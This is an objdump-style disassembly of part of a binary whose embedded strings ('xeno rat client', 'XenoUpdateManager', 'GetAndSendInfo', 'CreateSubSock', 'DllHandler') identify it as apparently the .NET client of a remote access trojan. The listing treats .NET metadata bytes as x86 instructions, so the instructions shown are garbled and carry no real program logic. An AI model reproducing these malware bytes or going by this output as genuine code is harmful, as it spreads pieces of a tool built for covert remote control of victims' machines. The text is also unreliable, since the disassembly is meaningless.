  40bdcc:	01 12                	add    %edx,(%edx)
  40bdce:	3c 12                	cmp    $0x12,%al
  40bdd0:	0c 06                	or     $0x6,%al
  40bdd2:	20 01                	and    %al,(%ecx)
  40bdd4:	12 11                	adc    (%ecx),%dl
  40bdd6:	1d 05 05 20 01       	sbb    $0x1200505,%eax
  40bddb:	01 12                	add    %edx,(%edx)
  40bddd:	3c 04                	cmp    $0x4,%al
  40bddf:	20 00                	and    %al,(%eax)
  40bde1:	12 11                	adc    (%ecx),%dl
  40bde3:	08 20                	or     %ah,(%eax)
  40bde5:	02 12                	add    (%edx),%dl
  40bde7:	11 12                	adc    %edx,(%edx)
  40bde9:	3c 1d                	cmp    $0x1d,%al
  40bdeb:	05 03 06 12 18       	add    $0x18120603,%eax
  40bdf0:	07                   	pop    %es
  40bdf1:	06                   	push   %es
  40bdf2:	15 11 25 01 12       	adc    $0x12012511,%eax
  40bdf7:	3c 06                	cmp    $0x6,%al
  40bdf9:	06                   	push   %es
  40bdfa:	15 11 25 01 0e       	adc    $0xe012511,%eax
  40bdff:	06                   	push   %es
  40be00:	06                   	push   %es
  40be01:	15 11 25 01 09       	adc    $0x9012511,%eax
  40be06:	07                   	pop    %es
  40be07:	06                   	push   %es
  40be08:	15 12 31 01 12       	adc    $0x12013112,%eax
  40be0d:	3c 07                	cmp    $0x7,%al
  40be0f:	06                   	push   %es
  40be10:	15 12 35 01 12       	adc    $0x12013512,%eax
  40be15:	3c 03                	cmp    $0x3,%al
  40be17:	06                   	push   %es
  40be18:	12 58 08             	adc    0x8(%eax),%bl
  40be1b:	00 03                	add    %al,(%ebx)
  40be1d:	08 1d 05 1d 05 0a    	or     %bl,0xa051d05
  40be23:	0b 20                	or     (%eax),%esp
  40be25:	02 01                	add    (%ecx),%al
  40be27:	12 58 15             	adc    0x15(%eax),%bl
  40be2a:	12 31                	adc    (%ecx),%dh
  40be2c:	01 12                	add    %edx,(%edx)
  40be2e:	3c 10                	cmp    $0x10,%al
  40be30:	20 03                	and    %al,(%ebx)
  40be32:	15 12 39 01 12       	adc    $0x12013912,%eax
  40be37:	3c 08                	cmp    $0x8,%al
  40be39:	08 15 12 31 01 12    	or     %dl,0x12013112
  40be3f:	3c 04                	cmp    $0x4,%al
  40be41:	00 00                	add    %al,(%eax)
  40be43:	00 00                	add    %al,(%eax)
  40be45:	03 20                	add    (%eax),%esp
  40be47:	00 02                	add    %al,(%edx)
  40be49:	08 20                	or     %ah,(%eax)
  40be4b:	00 15 12 39 01 1d    	add    %dl,0x1d013912
  40be51:	05 09 20 01 15       	add    $0x15012009,%eax
  40be56:	12 39                	adc    (%ecx),%bh
  40be58:	01 02                	add    %eax,(%edx)
  40be5a:	1d 05 07 20 02       	sbb    $0x2200705,%eax
  40be5f:	02 1d 05 1d 05 04    	add    0x4051d05,%bl
  40be65:	20 01                	and    %al,(%ecx)
  40be67:	01 08                	add    %ecx,(%eax)
  40be69:	09 20                	or     %esp,(%eax)
  40be6b:	02 15 12 39 01 02    	add    0x2013912,%dl
  40be71:	08 08                	or     %cl,(%eax)
  40be73:	06                   	push   %es
  40be74:	06                   	push   %es
  40be75:	15 11 3d 01 02       	adc    $0x2013d11,%eax
  40be7a:	07                   	pop    %es
  40be7b:	06                   	push   %es
  40be7c:	15 11 3d 01 12       	adc    $0x12013d11,%eax
  40be81:	3c 03                	cmp    $0x3,%al
  40be83:	06                   	push   %es
  40be84:	12 41 03             	adc    0x3(%ecx),%al
  40be87:	06                   	push   %es
  40be88:	11 45 07             	adc    %eax,0x7(%ebp)
  40be8b:	06                   	push   %es
  40be8c:	15 11 3d 01 1d       	adc    $0x1d013d11,%eax
  40be91:	05 02 06 02 07       	add    $0x7020602,%eax
  40be96:	20 02                	and    %al,(%edx)
  40be98:	01 12                	add    %edx,(%edx)
  40be9a:	41                   	inc    %ecx
  40be9b:	1d 05 09 20 01       	sbb    $0x1200905,%eax
  40bea0:	15 12 39 01 1d       	adc    $0x1d013912,%eax
  40bea5:	05 08 06 20 01       	add    $0x1200608,%eax
  40beaa:	12 54 1d 05          	adc    0x5(%ebp,%ebx,1),%dl
  40beae:	07                   	pop    %es
  40beaf:	20 02                	and    %al,(%edx)
  40beb1:	1d 05 1d 05 08       	sbb    $0x8051d05,%eax
  40beb6:	06                   	push   %es
  40beb7:	20 02                	and    %al,(%edx)
  40beb9:	08 1d 05 08 05 20    	or     %bl,0x20050805
  40bebf:	01 1d 05 08 03 06    	add    %ebx,0x6030805
  40bec5:	12 5c 0c 06          	adc    0x6(%esp,%ecx,1),%bl
  40bec9:	15 12 49 02 1d       	adc    $0x1d024912,%eax
  40bece:	05 15 12 4d 01       	add    $0x14d1215,%eax
  40bed3:	05 03 00 00 01       	add    $0x1000003,%eax
  40bed8:	09 20                	or     %esp,(%eax)
  40beda:	01 15 12 4d 01 05    	add    %edx,0x5014d12
  40bee0:	1d 05 03 06 11       	sbb    $0x11060305,%eax
  40bee5:	51                   	push   %ecx
  40bee6:	06                   	push   %es
  40bee7:	06                   	push   %es
  40bee8:	15 11 25 01 08       	adc    $0x8012511,%eax
  40beed:	03 06                	add    (%esi),%eax
  40beef:	12 55 06             	adc    0x6(%ebp),%dl
  40bef2:	00 01                	add    %al,(%ecx)
  40bef4:	12 11                	adc    (%ecx),%dl
  40bef6:	1d 0e 05 00 01       	sbb    $0x100050e,%eax
  40befb:	01 12                	add    %edx,(%edx)
  40befd:	3c 06                	cmp    $0x6,%al
  40beff:	00 02                	add    %al,(%edx)
  40bf01:	01 1c 12             	add    %ebx,(%edx,%edx,1)
  40bf04:	59                   	pop    %ecx
  40bf05:	05 00 01 01 1d       	add    $0x1d010100,%eax
  40bf0a:	0e                   	push   %cs
  40bf0b:	03 06                	add    (%esi),%eax
  40bf0d:	12 5d 05             	adc    0x5(%ebp),%bl
  40bf10:	20 01                	and    %al,(%ecx)
  40bf12:	01 12                	add    %edx,(%edx)
  40bf14:	5d                   	pop    %ebp
  40bf15:	04 20                	add    $0x20,%al
  40bf17:	00 12                	add    %dl,(%edx)
  40bf19:	61                   	popa
  40bf1a:	04 20                	add    $0x20,%al
  40bf1c:	01 01                	add    %eax,(%ecx)
  40bf1e:	03 04 20             	add    (%eax,%eiz,1),%eax
  40bf21:	01 01                	add    %eax,(%ecx)
  40bf23:	0e                   	push   %cs
  40bf24:	03 20                	add    (%eax),%esp
  40bf26:	00 0e                	add    %cl,(%esi)
  40bf28:	04 28                	add    $0x28,%al
  40bf2a:	00 12                	add    %dl,(%edx)
  40bf2c:	61                   	popa
  40bf2d:	03 00                	add    (%eax),%eax
  40bf2f:	00 02                	add    %al,(%edx)
  40bf31:	01 02                	add    %eax,(%edx)
  40bf33:	03 00                	add    (%eax),%eax
  40bf35:	00 18                	add    %bl,(%eax)
  40bf37:	07                   	pop    %es
  40bf38:	00 03                	add    %al,(%ebx)
  40bf3a:	08 18                	or     %bl,(%eax)
  40bf3c:	12 55 08             	adc    0x8(%ebp),%dl
  40bf3f:	04 00                	add    $0x0,%al
  40bf41:	01 08                	add    %ecx,(%eax)
  40bf43:	18 06                	sbb    %al,(%esi)
  40bf45:	00 02                	add    %al,(%edx)
  40bf47:	18 18                	sbb    %bl,(%eax)
  40bf49:	10 09                	adc    %cl,(%ecx)
  40bf4b:	07                   	pop    %es
  40bf4c:	00 01                	add    %al,(%ecx)
  40bf4e:	02 10                	add    (%eax),%dl
  40bf50:	11 80 80 04 00 01    	adc    %eax,0x1000480(%eax)
  40bf56:	02 18                	add    (%eax),%bl
  40bf58:	07                   	pop    %es
  40bf59:	00 00                	add    %al,(%eax)
  40bf5b:	15 12 39 01 0e       	adc    $0xe013912,%eax
  40bf60:	03 00                	add    (%eax),%eax
  40bf62:	00 0e                	add    %cl,(%esi)
  40bf64:	04 00                	add    $0x0,%al
  40bf66:	01 0e                	add    %ecx,(%esi)
  40bf68:	0e                   	push   %cs
  40bf69:	14 00                	adc    $0x0,%al
  40bf6b:	05 15 12 39 01       	add    $0x1391215,%eax
  40bf70:	12 3c 12             	adc    (%edx,%edx,1),%bh
  40bf73:	41                   	inc    %ecx
  40bf74:	1d 05 08 08 15       	sbb    $0x15080805,%eax
  40bf79:	12 31                	adc    (%ecx),%dh
  40bf7b:	01 12                	add    %edx,(%edx)
  40bf7d:	3c 05                	cmp    $0x5,%al
  40bf7f:	00 01                	add    %al,(%ecx)
  40bf81:	12 11                	adc    (%ecx),%dl
  40bf83:	0e                   	push   %cs
  40bf84:	04 00                	add    $0x0,%al
  40bf86:	00 12                	add    %dl,(%edx)
  40bf88:	11 09                	adc    %ecx,(%ecx)
  40bf8a:	00 02                	add    %al,(%edx)
  40bf8c:	15 12 39 01 02       	adc    $0x2013912,%eax
  40bf91:	0e                   	push   %cs
  40bf92:	0e                   	push   %cs
  40bf93:	22 58 00             	and    0x0(%eax),%bl
  40bf96:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40bf9a:	6f                   	outsl  %ds:(%esi),(%dx)
  40bf9b:	00 55 00             	add    %dl,0x0(%ebp)
  40bf9e:	70 00                	jo     0x40bfa0
  40bfa0:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40bfa4:	74 00                	je     0x40bfa6
  40bfa6:	65 00 4d 00          	add    %cl,%gs:0x0(%ebp)
  40bfaa:	61                   	popa
  40bfab:	00 6e 00             	add    %ch,0x0(%esi)
  40bfae:	61                   	popa
  40bfaf:	00 67 00             	add    %ah,0x0(%edi)
  40bfb2:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40bfb6:	07                   	pop    %es
  40bfb7:	00 00                	add    %al,(%eax)
  40bfb9:	15 12 39 01 09       	adc    $0x9013912,%eax
  40bfbe:	03 00                	add    (%eax),%eax
  40bfc0:	00 09                	add    %cl,(%ecx)
  40bfc2:	02 06                	add    (%esi),%al
  40bfc4:	09 04 06             	or     %eax,(%esi,%eax,1)
  40bfc7:	12 80 84 06 06 15    	adc    0x15060684(%eax),%al
  40bfcd:	12 65 01             	adc    0x1(%ebp),%ah
  40bfd0:	0e                   	push   %cs
  40bfd1:	06                   	push   %es
  40bfd2:	06                   	push   %es
  40bfd3:	15 12 65 01 09       	adc    $0x9016512,%eax
  40bfd8:	03 20                	add    (%eax),%esp
  40bfda:	00 09                	add    %cl,(%ecx)
  40bfdc:	03 06                	add    (%esi),%eax
  40bfde:	12 69 06             	adc    0x6(%ecx),%ch
  40bfe1:	06                   	push   %es
  40bfe2:	15 11 3d 01 0e       	adc    $0xe013d11,%eax
  40bfe7:	06                   	push   %es
  40bfe8:	06                   	push   %es
  40bfe9:	15 11 3d 01 09       	adc    $0x9013d11,%eax
  40bfee:	04 06                	add    $0x6,%al
  40bff0:	11 80 b0 04 06 11    	adc    %eax,0x110604b0(%eax)
  40bff6:	80 b4 08 01 00 08 00 	xorb   $0x0,0x80001(%eax,%ecx,1)
  40bffd:	00 
  40bffe:	00 00                	add    %al,(%eax)
  40c000:	00 1e                	add    %bl,(%esi)
  40c002:	01 00                	add    %eax,(%eax)
  40c004:	01 00                	add    %eax,(%eax)
  40c006:	54                   	push   %esp
  40c007:	02 16                	add    (%esi),%dl
  40c009:	57                   	push   %edi
  40c00a:	72 61                	jb     0x40c06d
  40c00c:	70 4e                	jo     0x40c05c
  40c00e:	6f                   	outsl  %ds:(%esi),(%dx)
  40c00f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c010:	45                   	inc    %ebp
  40c011:	78 63                	js     0x40c076
  40c013:	65 70 74             	gs jo  0x40c08a
  40c016:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  40c01d:	77 73                	ja     0x40c092
  40c01f:	01 05 20 01 01 11    	add    %eax,0x11010120
  40c025:	79 08                	jns    0x40c02f
  40c027:	01 00                	add    %eax,(%eax)
  40c029:	02 00                	add    (%eax),%al
  40c02b:	00 00                	add    %al,(%eax)
  40c02d:	00 00                	add    %al,(%eax)
  40c02f:	14 01                	adc    $0x1,%al
  40c031:	00 0f                	add    %cl,(%edi)
  40c033:	78 65                	js     0x40c09a
  40c035:	6e                   	outsb  %ds:(%esi),(%dx)
  40c036:	6f                   	outsl  %ds:(%esi),(%dx)
  40c037:	20 72 61             	and    %dh,0x61(%edx)
  40c03a:	74 20                	je     0x40c05c
  40c03c:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c040:	6e                   	outsb  %ds:(%esi),(%dx)
  40c041:	74 00                	je     0x40c043
  40c043:	00 05 01 00 00 00    	add    %al,0x1
  40c049:	00 17                	add    %dl,(%edi)
  40c04b:	01 00                	add    %eax,(%eax)
  40c04d:	12 43 6f             	adc    0x6f(%ebx),%al
  40c050:	70 79                	jo     0x40c0cb
  40c052:	72 69                	jb     0x40c0bd
  40c054:	67 68 74 20 c2 a9    	addr16 push $0xa9c22074
  40c05a:	20 20                	and    %ah,(%eax)
  40c05c:	32 30                	xor    (%eax),%dh
  40c05e:	32 33                	xor    (%ebx),%dh
  40c060:	00 00                	add    %al,(%eax)
  40c062:	04 20                	add    $0x20,%al
  40c064:	01 01                	add    %eax,(%ecx)
  40c066:	02 29                	add    (%ecx),%ch
  40c068:	01 00                	add    %eax,(%eax)
  40c06a:	24 33                	and    $0x33,%al
  40c06c:	31 30                	xor    %esi,(%eax)
  40c06e:	66 63 35 62 65 2d 36 	arpl   %si,0x362d6562
  40c075:	66 35 65 2d          	xor    $0x2d65,%ax
  40c079:	34 37                	xor    $0x37,%al
  40c07b:	39 63 2d             	cmp    %esp,0x2d(%ebx)
  40c07e:	61                   	popa
  40c07f:	32 34 36             	xor    (%esi,%esi,1),%dh
  40c082:	2d 36 30 39 33       	sub    $0x33393036,%eax
  40c087:	61                   	popa
  40c088:	33 39                	xor    (%ecx),%edi
  40c08a:	32 39                	xor    (%ecx),%bh
  40c08c:	36 63 30             	arpl   %esi,%ss:(%eax)
  40c08f:	00 00                	add    %al,(%eax)
  40c091:	0c 01                	or     $0x1,%al
  40c093:	00 07                	add    %al,(%edi)
  40c095:	31 2e                	xor    %ebp,(%esi)
  40c097:	30 2e                	xor    %ch,(%esi)
  40c099:	30 2e                	xor    %ch,(%esi)
  40c09b:	30 00                	xor    %al,(%eax)
  40c09d:	00 49 01             	add    %cl,0x1(%ecx)
  40c0a0:	00 1a                	add    %bl,(%edx)
  40c0a2:	2e 4e                	cs dec %esi
  40c0a4:	45                   	inc    %ebp
  40c0a5:	54                   	push   %esp
  40c0a6:	46                   	inc    %esi
  40c0a7:	72 61                	jb     0x40c10a
  40c0a9:	6d                   	insl   (%dx),%es:(%edi)
  40c0aa:	65 77 6f             	gs ja  0x40c11c
  40c0ad:	72 6b                	jb     0x40c11a
  40c0af:	2c 56                	sub    $0x56,%al
  40c0b1:	65 72 73             	gs jb  0x40c127
  40c0b4:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  40c0bb:	38 01                	cmp    %al,(%ecx)
  40c0bd:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  40c0c1:	46                   	inc    %esi
  40c0c2:	72 61                	jb     0x40c125
  40c0c4:	6d                   	insl   (%dx),%es:(%edi)
  40c0c5:	65 77 6f             	gs ja  0x40c137
  40c0c8:	72 6b                	jb     0x40c135
  40c0ca:	44                   	inc    %esp
  40c0cb:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  40c0d2:	61                   	popa
  40c0d3:	6d                   	insl   (%dx),%es:(%edi)
  40c0d4:	65 12 2e             	adc    %gs:(%esi),%ch
  40c0d7:	4e                   	dec    %esi
  40c0d8:	45                   	inc    %ebp
  40c0d9:	54                   	push   %esp
  40c0da:	20 46 72             	and    %al,0x72(%esi)
  40c0dd:	61                   	popa
  40c0de:	6d                   	insl   (%dx),%es:(%edi)
  40c0df:	65 77 6f             	gs ja  0x40c151
  40c0e2:	72 6b                	jb     0x40c14f
  40c0e4:	20 34 2e             	and    %dh,(%esi,%ebp,1)
  40c0e7:	38 06                	cmp    %al,(%esi)
  40c0e9:	20 01                	and    %al,(%ecx)
  40c0eb:	01 12                	add    %edx,(%edx)
  40c0ed:	80 ad 34 01 00 2f 78 	subb   $0x78,0x2f000134(%ebp)
  40c0f4:	65 6e                	outsb  %gs:(%esi),(%dx)
  40c0f6:	6f                   	outsl  %ds:(%esi),(%dx)
  40c0f7:	5f                   	pop    %edi
  40c0f8:	72 61                	jb     0x40c15b
  40c0fa:	74 5f                	je     0x40c15b
  40c0fc:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c100:	6e                   	outsb  %ds:(%esi),(%dx)
  40c101:	74 2e                	je     0x40c131
  40c103:	44                   	inc    %esp
  40c104:	6c                   	insb   (%dx),%es:(%edi)
  40c105:	6c                   	insb   (%dx),%es:(%edi)
  40c106:	48                   	dec    %eax
  40c107:	61                   	popa
  40c108:	6e                   	outsb  %ds:(%esi),(%dx)
  40c109:	64 6c                	fs insb (%dx),%es:(%edi)
  40c10b:	65 72 2b             	gs jb  0x40c139
  40c10e:	3c 44                	cmp    $0x44,%al
  40c110:	6c                   	insb   (%dx),%es:(%edi)
  40c111:	6c                   	insb   (%dx),%es:(%edi)
  40c112:	4e                   	dec    %esi
  40c113:	6f                   	outsl  %ds:(%esi),(%dx)
  40c114:	64 65 48             	fs gs dec %eax
  40c117:	61                   	popa
  40c118:	6e                   	outsb  %ds:(%esi),(%dx)
  40c119:	64 6c                	fs insb (%dx),%es:(%edi)
  40c11b:	65 72 3e             	gs jb  0x40c15c
  40c11e:	64 5f                	fs pop %edi
  40c120:	5f                   	pop    %edi
  40c121:	33 00                	xor    (%eax),%eax
  40c123:	00 04 01             	add    %al,(%ecx,%eax,1)
  40c126:	00 00                	add    %al,(%eax)
  40c128:	00 30                	add    %dh,(%eax)
  40c12a:	01 00                	add    %eax,(%eax)
  40c12c:	2b 78 65             	sub    0x65(%eax),%edi
  40c12f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c130:	6f                   	outsl  %ds:(%esi),(%dx)
  40c131:	5f                   	pop    %edi
  40c132:	72 61                	jb     0x40c195
  40c134:	74 5f                	je     0x40c195
  40c136:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c13a:	6e                   	outsb  %ds:(%esi),(%dx)
  40c13b:	74 2e                	je     0x40c16b
  40c13d:	48                   	dec    %eax
  40c13e:	61                   	popa
  40c13f:	6e                   	outsb  %ds:(%esi),(%dx)
  40c140:	64 6c                	fs insb (%dx),%es:(%edi)
  40c142:	65 72 2b             	gs jb  0x40c170
  40c145:	3c 43                	cmp    $0x43,%al
  40c147:	72 65                	jb     0x40c1ae
  40c149:	61                   	popa
  40c14a:	74 65                	je     0x40c1b1
  40c14c:	53                   	push   %ebx
  40c14d:	75 62                	jne    0x40c1b1
  40c14f:	53                   	push   %ebx
  40c150:	6f                   	outsl  %ds:(%esi),(%dx)
  40c151:	63 6b 3e             	arpl   %ebp,0x3e(%ebx)
  40c154:	64 5f                	fs pop %edi
  40c156:	5f                   	pop    %edi
  40c157:	33 00                	xor    (%eax),%eax
  40c159:	00 31                	add    %dh,(%ecx)
  40c15b:	01 00                	add    %eax,(%eax)
  40c15d:	2c 78                	sub    $0x78,%al
  40c15f:	65 6e                	outsb  %gs:(%esi),(%dx)
  40c161:	6f                   	outsl  %ds:(%esi),(%dx)
  40c162:	5f                   	pop    %edi
  40c163:	72 61                	jb     0x40c1c6
  40c165:	74 5f                	je     0x40c1c6
  40c167:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c16b:	6e                   	outsb  %ds:(%esi),(%dx)
  40c16c:	74 2e                	je     0x40c19c
  40c16e:	48                   	dec    %eax
  40c16f:	61                   	popa
  40c170:	6e                   	outsb  %ds:(%esi),(%dx)
  40c171:	64 6c                	fs insb (%dx),%es:(%edi)
  40c173:	65 72 2b             	gs jb  0x40c1a1
  40c176:	3c 47                	cmp    $0x47,%al
  40c178:	65 74 41             	gs je  0x40c1bc
  40c17b:	6e                   	outsb  %ds:(%esi),(%dx)
  40c17c:	64 53                	fs push %ebx
  40c17e:	65 6e                	outsb  %gs:(%esi),(%dx)
  40c180:	64 49                	fs dec %ecx
  40c182:	6e                   	outsb  %ds:(%esi),(%dx)
  40c183:	66 6f                	outsw  %ds:(%esi),(%dx)
  40c185:	3e 64 5f             	ds fs pop %edi
  40c188:	5f                   	pop    %edi
  40c189:	35 00 00 2f 01       	xor    $0x12f0000,%eax
  40c18e:	00 2a                	add    %ch,(%edx)
  40c190:	78 65                	js     0x40c1f7
  40c192:	6e                   	outsb  %ds:(%esi),(%dx)
  40c193:	6f                   	outsl  %ds:(%esi),(%dx)
  40c194:	5f                   	pop    %edi
  40c195:	72 61                	jb     0x40c1f8
  40c197:	74 5f                	je     0x40c1f8
  40c199:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c19d:	6e                   	outsb  %ds:(%esi),(%dx)
  40c19e:	74 2e                	je     0x40c1ce
  40c1a0:	48                   	dec    %eax
  40c1a1:	61                   	popa
  40c1a2:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1a3:	64 6c                	fs insb (%dx),%es:(%edi)
  40c1a5:	65 72 2b             	gs jb  0x40c1d3
  40c1a8:	3c 54                	cmp    $0x54,%al
  40c1aa:	79 70                	jns    0x40c21c
  40c1ac:	65 30 52 65          	xor    %dl,%gs:0x65(%edx)
  40c1b0:	63 65 69             	arpl   %esp,0x69(%ebp)
  40c1b3:	76 65                	jbe    0x40c21a
  40c1b5:	3e 64 5f             	ds fs pop %edi
  40c1b8:	5f                   	pop    %edi
  40c1b9:	36 00 00             	add    %al,%ss:(%eax)
  40c1bc:	2f                   	das
  40c1bd:	01 00                	add    %eax,(%eax)
  40c1bf:	2a 78 65             	sub    0x65(%eax),%bh
  40c1c2:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1c3:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1c4:	5f                   	pop    %edi
  40c1c5:	72 61                	jb     0x40c228
  40c1c7:	74 5f                	je     0x40c228
  40c1c9:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c1cd:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1ce:	74 2e                	je     0x40c1fe
  40c1d0:	48                   	dec    %eax
  40c1d1:	61                   	popa
  40c1d2:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1d3:	64 6c                	fs insb (%dx),%es:(%edi)
  40c1d5:	65 72 2b             	gs jb  0x40c203
  40c1d8:	3c 54                	cmp    $0x54,%al
  40c1da:	79 70                	jns    0x40c24c
  40c1dc:	65 31 52 65          	xor    %edx,%gs:0x65(%edx)
  40c1e0:	63 65 69             	arpl   %esp,0x69(%ebp)
  40c1e3:	76 65                	jbe    0x40c24a
  40c1e5:	3e 64 5f             	ds fs pop %edi
  40c1e8:	5f                   	pop    %edi
  40c1e9:	37                   	aaa
  40c1ea:	00 00                	add    %al,(%eax)
  40c1ec:	2b 01                	sub    (%ecx),%eax
  40c1ee:	00 26                	add    %ah,(%esi)
  40c1f0:	78 65                	js     0x40c257
  40c1f2:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1f3:	6f                   	outsl  %ds:(%esi),(%dx)
  40c1f4:	5f                   	pop    %edi
  40c1f5:	72 61                	jb     0x40c258
  40c1f7:	74 5f                	je     0x40c258
  40c1f9:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c1fd:	6e                   	outsb  %ds:(%esi),(%dx)
  40c1fe:	74 2e                	je     0x40c22e
  40c200:	48                   	dec    %eax
  40c201:	61                   	popa
  40c202:	6e                   	outsb  %ds:(%esi),(%dx)
  40c203:	64 6c                	fs insb (%dx),%es:(%edi)
  40c205:	65 72 2b             	gs jb  0x40c233
  40c208:	3c 73                	cmp    $0x73,%al
  40c20a:	65 74 53             	gs je  0x40c260
  40c20d:	65 74 49             	gs je  0x40c259
  40c210:	64 3e 64 5f          	fs ds fs pop %edi
  40c214:	5f                   	pop    %edi
  40c215:	38 00                	cmp    %al,(%eax)
  40c217:	00 2f                	add    %ch,(%edi)
  40c219:	01 00                	add    %eax,(%eax)
  40c21b:	2a 78 65             	sub    0x65(%eax),%bh
  40c21e:	6e                   	outsb  %ds:(%esi),(%dx)
  40c21f:	6f                   	outsl  %ds:(%esi),(%dx)
  40c220:	5f                   	pop    %edi
  40c221:	72 61                	jb     0x40c284
  40c223:	74 5f                	je     0x40c284
  40c225:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c229:	6e                   	outsb  %ds:(%esi),(%dx)
  40c22a:	74 2e                	je     0x40c25a
  40c22c:	48                   	dec    %eax
  40c22d:	61                   	popa
  40c22e:	6e                   	outsb  %ds:(%esi),(%dx)
  40c22f:	64 6c                	fs insb (%dx),%es:(%edi)
  40c231:	65 72 2b             	gs jb  0x40c25f
  40c234:	3c 54                	cmp    $0x54,%al
  40c236:	79 70                	jns    0x40c2a8
  40c238:	65 32 52 65          	xor    %gs:0x65(%edx),%dl
  40c23c:	63 65 69             	arpl   %esp,0x69(%ebp)
  40c23f:	76 65                	jbe    0x40c2a6
  40c241:	3e 64 5f             	ds fs pop %edi
  40c244:	5f                   	pop    %edi
  40c245:	39 00                	cmp    %eax,(%eax)
  40c247:	00 2d 01 00 28 78    	add    %ch,0x78280001
  40c24d:	65 6e                	outsb  %gs:(%esi),(%dx)
  40c24f:	6f                   	outsl  %ds:(%esi),(%dx)
  40c250:	5f                   	pop    %edi
  40c251:	72 61                	jb     0x40c2b4
  40c253:	74 5f                	je     0x40c2b4
  40c255:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c259:	6e                   	outsb  %ds:(%esi),(%dx)
  40c25a:	74 2e                	je     0x40c28a
  40c25c:	48                   	dec    %eax
  40c25d:	61                   	popa
  40c25e:	6e                   	outsb  %ds:(%esi),(%dx)
  40c25f:	64 6c                	fs insb (%dx),%es:(%edi)
  40c261:	65 72 2b             	gs jb  0x40c28f
  40c264:	3c 44                	cmp    $0x44,%al
  40c266:	65 62 75 67          	bound  %esi,%gs:0x67(%ebp)
  40c26a:	4d                   	dec    %ebp
  40c26b:	65 6e                	outsb  %gs:(%esi),(%dx)
  40c26d:	75 3e                	jne    0x40c2ad
  40c26f:	64 5f                	fs pop %edi
  40c271:	5f                   	pop    %edi
  40c272:	31 30                	xor    %esi,(%eax)
  40c274:	00 00                	add    %al,(%eax)
  40c276:	32 01                	xor    (%ecx),%al
  40c278:	00 2d 78 65 6e 6f    	add    %ch,0x6f6e6578
  40c27e:	5f                   	pop    %edi
  40c27f:	72 61                	jb     0x40c2e2
  40c281:	74 5f                	je     0x40c2e2
  40c283:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c287:	6e                   	outsb  %ds:(%esi),(%dx)
  40c288:	74 2e                	je     0x40c2b8
  40c28a:	48                   	dec    %eax
  40c28b:	61                   	popa
  40c28c:	6e                   	outsb  %ds:(%esi),(%dx)
  40c28d:	64 6c                	fs insb (%dx),%es:(%edi)
  40c28f:	65 72 2b             	gs jb  0x40c2bd
  40c292:	3c 53                	cmp    $0x53,%al
  40c294:	65 6e                	outsb  %gs:(%esi),(%dx)
  40c296:	64 55                	fs push %ebp
  40c298:	70 64                	jo     0x40c2fe
  40c29a:	61                   	popa
  40c29b:	74 65                	je     0x40c302
  40c29d:	49                   	dec    %ecx
  40c29e:	6e                   	outsb  %ds:(%esi),(%dx)
  40c29f:	66 6f                	outsw  %ds:(%esi),(%dx)
  40c2a1:	3e 64 5f             	ds fs pop %edi
  40c2a4:	5f                   	pop    %edi
  40c2a5:	31 31                	xor    %esi,(%ecx)
  40c2a7:	00 00                	add    %al,(%eax)
  40c2a9:	2b 01                	sub    (%ecx),%eax
  40c2ab:	00 26                	add    %ah,(%esi)
  40c2ad:	78 65                	js     0x40c314
  40c2af:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2b0:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2b1:	5f                   	pop    %edi
  40c2b2:	72 61                	jb     0x40c315
  40c2b4:	74 5f                	je     0x40c315
  40c2b6:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c2ba:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2bb:	74 2e                	je     0x40c2eb
  40c2bd:	4e                   	dec    %esi
  40c2be:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2bf:	64 65 2b 3c 44       	fs sub %gs:(%esp,%eax,2),%edi
  40c2c4:	69 73 63 6f 6e 6e 65 	imul   $0x656e6e6f,0x63(%ebx),%esi
  40c2cb:	63 74 3e 64          	arpl   %esi,0x64(%esi,%edi,1)
  40c2cf:	5f                   	pop    %edi
  40c2d0:	5f                   	pop    %edi
  40c2d1:	31 30                	xor    %esi,(%eax)
  40c2d3:	00 00                	add    %al,(%eax)
  40c2d5:	34 01                	xor    $0x1,%al
  40c2d7:	00 2f                	add    %ch,(%edi)
  40c2d9:	78 65                	js     0x40c340
  40c2db:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2dc:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2dd:	5f                   	pop    %edi
  40c2de:	72 61                	jb     0x40c341
  40c2e0:	74 5f                	je     0x40c341
  40c2e2:	63 6c 69 65          	arpl   %ebp,0x65(%ecx,%ebp,2)
  40c2e6:	6e                   	outsb  %ds:(%esi),(%dx)
  40c2e7:	74 2e                	je     0x40c317
  40c2e9:	4e                   	dec    %esi
  40c2ea:	6f                   	outsl  %ds:(%esi),(%dx)
  40c2eb:	64 65 2b 3c 43       	fs sub %gs:(%ebx,%eax,2),%edi
